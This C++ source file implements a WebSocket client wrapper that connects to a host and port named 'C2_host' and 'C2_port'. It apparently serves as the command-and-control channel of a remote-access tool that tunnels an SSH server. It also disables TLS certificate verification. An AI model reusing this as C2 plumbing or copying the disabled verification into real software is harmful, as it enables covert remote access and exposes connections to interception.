#include "cid_websockets.h"

using websocketpp::lib::placeholders::_1;
using websocketpp::lib::placeholders::_2;
using websocketpp::lib::bind;

std::mutex WebsocketsWrapper::mtx;
std::vector<unsigned char> WebsocketsWrapper::buffer;

WebsocketsWrapper::WebsocketsWrapper(const char* C2_host, unsigned short C2_port, std::shared_ptr<asio::io_service> io)
{

    this->uri = "wss://" + std::string(C2_host) + ":" + std::to_string(C2_port);
    try {
        // Set logging to be pretty verbose (everything except message payloads)
        ws_client.set_access_channels(websocketpp::log::alevel::all);
        ws_client.clear_access_channels(websocketpp::log::alevel::frame_payload);
        ws_client.set_error_channels(websocketpp::log::elevel::all);
        ws_client.set_socket_init_handler(bind(&WebsocketsWrapper::conn_socket_handler, this, ::_1, ::_2));
        ws_client.set_user_agent("test11111111"); // ToDo: Set to something unique that the server will verify to prevent outsiders poking with our ssh server

        // Initialize ASIO
        ws_client.init_asio(io.get());

        ws_client.set_tls_init_handler(bind(&on_tls_init, ::_1));
        websocketpp::lib::error_code ec;
        con = ws_client.get_connection(uri, ec);       

        if (ec) {
            std::cout << "could not create connection because: " << ec.message() << std::endl;
            return;
        }

        con = ws_client.connect(con);
    }
    catch (websocketpp::exception const& e) {
        std::cout << e.what() << std::endl;
    }
    
   // WebsocketsWrapper::connected = true;
}


void WebsocketsWrapper::conn_socket_handler(websocketpp::connection_hdl hdl, websocketpp::lib::asio::ssl::stream<websocketpp::lib::asio::ip::tcp::socket>& thing) {
    socket = &thing;   
}

websocketpp::lib::asio::io_service* WebsocketsWrapper::get_io_service()
{
    return &ws_client.get_io_service();
}

void WebsocketsWrapper::run()
{
    if (io_thread) {
        ws_client.stop();
        io_thread->join();
    }

    io_thread = std::make_shared<std::thread>(std::thread(&client::run, &ws_client));
}

bool WebsocketsWrapper::is_connected() {
    int TIMEOUT = 5;
    auto start = std::chrono::system_clock::now();
    std::chrono::duration<double> elapsed_seconds = std::chrono::nanoseconds::zero();

    while (con->get_state() != websocketpp::session::state::open && elapsed_seconds.count() < TIMEOUT) {
        elapsed_seconds = std::chrono::system_clock::now() - start;        
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }

    return con->get_state() == websocketpp::session::state::open;
}
WebsocketsWrapper::context_ptr WebsocketsWrapper::on_tls_init(websocketpp::connection_hdl)
{
    context_ptr ctx = websocketpp::lib::make_shared<asio::ssl::context>(asio::ssl::context::sslv23);
    ctx->set_verify_mode(asio::ssl::verify_none);
    return ctx;
}
